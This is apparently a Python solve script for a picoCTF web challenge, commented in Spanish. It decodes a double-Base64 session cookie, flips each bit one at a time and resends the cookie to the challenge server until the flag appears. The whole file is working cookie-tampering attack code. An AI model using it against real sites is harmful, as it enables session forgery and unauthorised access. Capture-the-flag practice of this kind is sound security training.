import requests
import base64
import re

url = "http://wily-courier.picoctf.net:61231/"

print("[*] Conectando al servidor para obtener la cookie original...")
s = requests.Session()
r = s.get(url)
cookie = s.cookies.get('auth_name')

if not cookie:
    print("[-] Error: No se pudo obtener la cookie.")
    exit()

print(f"[*] Cookie original: {cookie[:20]}...")

# Decodificamos la cookie (Doble Base64)
try:
    decoded_once = base64.b64decode(cookie)
    raw_bytes = bytearray(base64.b64decode(decoded_once))
except Exception as e:
    print(f"[-] Error al decodificar la cookie: {e}")
    exit()

print(f"[*] Iniciando ataque de Bit-Flipping sobre {len(raw_bytes)} bytes...")

# Bucle para alterar cada bit de cada byte
for byte_idx in range(len(raw_bytes)):
    for bit_idx in range(8):
        
        # Copiamos los bytes originales
        mutated_bytes = bytearray(raw_bytes)
        
        # Aplicamos XOR para voltear un solo bit (0 a 1, o 1 a 0)
        mutated_bytes[byte_idx] ^= (1 << bit_idx)
        
        # Volvemos a codificar en Base64 dos veces
        encoded_once = base64.b64encode(mutated_bytes)
        final_cookie = base64.b64encode(encoded_once).decode('utf-8')
        
        # Enviamos la cookie mutada al servidor
        cookies = {'auth_name': final_cookie}
        res = requests.get(url, cookies=cookies)
        
        # Buscamos la bandera en el HTML de respuesta
        if "picoCTF{" in res.text:
            print(f"\n[+] ¡ÉXITO! Modificación letal en el byte {byte_idx}, bit {bit_idx}")
            
            # Extraemos la bandera limpiamente
            match = re.search(r'picoCTF\{.*?\}', res.text)
            if match:
                print(f"\n[🏆] BANDERA: {match.group(0)}")
            else:
                print("Bandera encontrada pero falló el regex. Revisa la respuesta raw.")
            exit()
            
    # Feedback visual para saber que el script sigue vivo
    if byte_idx % 5 == 0:
        print(f"[*] Progreso: probados {byte_idx}/{len(raw_bytes)} bytes...")

print("\n[-] Ataque terminado. No se encontró la bandera.")
